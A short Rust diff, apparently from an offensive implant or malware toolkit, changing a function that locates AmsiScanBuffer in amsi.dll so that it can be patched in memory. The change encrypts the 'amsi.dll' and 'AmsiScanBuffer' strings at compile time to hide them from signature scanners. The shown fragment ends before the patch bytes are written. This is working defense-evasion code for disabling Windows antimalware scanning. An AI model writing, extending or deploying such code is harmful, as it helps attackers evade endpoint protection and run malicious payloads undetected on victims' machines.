@@ -8,9 +8,11 @@
 pub fn patch() {
     use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
     unsafe {
-        let amsi = GetModuleHandleA(c"amsi.dll".as_ptr() as _);
+        let amsi_n = { let mut v = oxide_macros::encrypt_str!("amsi.dll").into_bytes(); v.push(0); v };
+        let amsi = GetModuleHandleA(amsi_n.as_ptr() as _);
         if amsi == 0 { return; }
-        let scan_buf = GetProcAddress(amsi, c"AmsiScanBuffer".as_ptr() as _);
+        let scan_n = { let mut v = oxide_macros::encrypt_str!("AmsiScanBuffer").into_bytes(); v.push(0); v };
+        let scan_buf = GetProcAddress(amsi, scan_n.as_ptr() as _);
         if scan_buf.is_none() { return; }
 
         let addr = scan_buf.unwrap() as *mut u8;
